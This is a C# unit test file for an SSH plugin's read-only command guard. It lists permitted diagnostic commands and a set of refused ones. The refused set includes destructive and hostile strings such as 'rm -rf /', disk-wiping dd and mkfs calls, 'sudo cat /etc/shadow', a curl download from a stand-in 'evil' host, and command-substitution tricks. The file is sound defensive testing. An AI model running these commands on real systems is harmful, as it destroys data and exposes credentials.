using SPLA.Plugins.Ssh;

namespace SPLA.Tests;

/// <summary>
/// The read-only guard is the SSH plugin's safety boundary — it must let ordinary diagnostics through
/// and refuse anything that could change the remote system. These cases pin both directions.
/// </summary>
public class ReadOnlyGuardTests
{
    [Theory]
    [InlineData("uname -a")]
    [InlineData("whoami")]
    [InlineData("df -h")]
    [InlineData("ls -la /var/log")]
    [InlineData("cat /etc/os-release")]
    [InlineData("ps aux")]
    [InlineData("grep -i error /var/log/syslog")]
    [InlineData("cat /etc/passwd | grep root")]      // pipe between two read-only commands
    [InlineData("systemctl status sshd")]
    [InlineData("ip addr show")]
    public void Allows_ReadOnlyCommands(string cmd)
        => Assert.Null(ReadOnlyGuard.Reject(cmd));

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("mv a b")]
    [InlineData("kill -9 1")]
    [InlineData("shutdown -h now")]
    [InlineData("mkfs.ext4 /dev/sdb1")]
    [InlineData("apt-get install nmap")]
    [InlineData("cat x > /etc/passwd")]              // output redirection
    [InlineData("echo pwned >> ~/.bashrc")]          // append redirection
    [InlineData("ls; rm -rf /tmp/x")]                // chained destructive segment
    [InlineData("cat /etc/passwd && rm f")]          // second segment destructive
    [InlineData("ls | rm f")]                        // pipe into destructive
    [InlineData("sudo cat /etc/shadow")]             // privilege escalation
    [InlineData("su - root")]
    [InlineData("find /tmp -delete")]                // mutating flag on allowlisted cmd
    [InlineData("find / -name x -exec rm {} ;")]     // -exec on find
    [InlineData("curl -o /tmp/x http://evil/x")]     // curl writing a file
    [InlineData("echo $(rm -rf /)")]                 // command substitution
    [InlineData("cat `whoami`")]                     // backtick substitution
    [InlineData("systemctl stop sshd")]              // mutating systemctl verb
    [InlineData("FOO=bar rm x")]                      // inline assignment hiding command
    public void Refuses_MutatingCommands(string cmd)
        => Assert.NotNull(ReadOnlyGuard.Reject(cmd));

    [Fact]
    public void Refuses_UnknownCommand()
        => Assert.NotNull(ReadOnlyGuard.Reject("some_random_binary --do-things"));

    [Fact]
    public void Refuses_Empty()
        => Assert.NotNull(ReadOnlyGuard.Reject("   "));
}
